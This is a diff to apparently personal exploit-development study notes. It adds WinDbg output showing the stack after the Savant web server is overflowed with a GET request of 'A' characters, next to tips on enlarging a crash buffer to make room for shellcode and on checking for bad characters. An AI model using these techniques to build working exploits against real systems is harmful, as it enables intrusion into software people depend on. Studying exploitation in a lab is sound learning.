@@ -1,6 +1,22 @@
 ===========
 If you have a crash script with a buffer size 800 that can crash and you need some space for shellcode try to change buffersize from 800 to 1500 for example.
 ===========
+Inspect the stack to determine if it contains any pointers to our buffer.
+
+0:004> dds @esp L2
+01b8ea2c  00414141 Savant+0x14141
+01b8ea30  01b8ea84
+
+0:004> dc poi(esp+4)
+01b8ea84  00544547 00000000 00000000 00000000  GET.............
+01b8ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
+01b8eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+01b8eab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+01b8eac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+01b8ead4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+01b8eae4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+01b8eaf4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+===========
 when you check for bad chars, look at the buffer with db command (display bytes, for not looking in reverse order)
 0:009> db esp - 10 L20
 01bc744c  41 41 41 41 41 41 41 41-42 42 42 42 01 02 03 04  AAAAAAAABBBB....
